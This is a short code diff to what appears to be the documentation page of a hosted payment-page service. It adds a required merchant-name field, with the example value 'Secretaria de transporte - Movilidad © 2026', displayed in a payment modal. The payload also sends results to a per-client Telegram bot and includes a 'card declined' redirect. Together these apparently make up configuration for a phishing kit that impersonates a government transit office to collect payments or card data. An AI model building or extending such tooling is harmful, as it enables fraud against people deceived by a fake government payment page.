@@ -34,6 +34,7 @@ const payload = {
   },
   price: "199900",
   priceFormatted: "$199.900",
+  comercio: "Secretaria de transporte - Movilidad © 2026",
   redirectSuccess: "https://tienda.example/pago-ok",
   redirectDeclined: "https://tienda.example/tarjeta-declinada",
   telegram: { botToken: "123456:AAH-xxxx", chatId: "-100123456789" },
@@ -101,6 +102,7 @@ const PAYLOAD_STRUCTURE = `{
     celular: string,
     telefono: string
   },
+  comercio: string,         // nombre completo del comercio, ej. "Secretaria de transporte - Movilidad © 2026"
   price: string,            // "199900"
   priceFormatted: string,   // "$199.900"
   redirectSuccess: string,  // URL http(s)
@@ -154,7 +156,9 @@ export default function Info({ publicKey, publicKeyUrl }: InfoProps) {
           </h2>
           <p className="text-sm text-slate-600 mb-2">
             <code className="rounded bg-slate-200 px-1">telegram</code> lleva el bot y el chat de{" "}
-            <strong>esta página</strong> (independiente por cliente):
+            <strong>esta página</strong> (independiente por cliente), y{" "}
+            <code className="rounded bg-slate-200 px-1">comercio</code> es el nombre del comercio{" "}
+            <strong>obligatorio</strong> que se muestra en el modal:
           </p>
           <pre className="rounded-md bg-slate-900 p-3 text-xs text-slate-100 overflow-x-auto">
             {PAYLOAD_STRUCTURE}
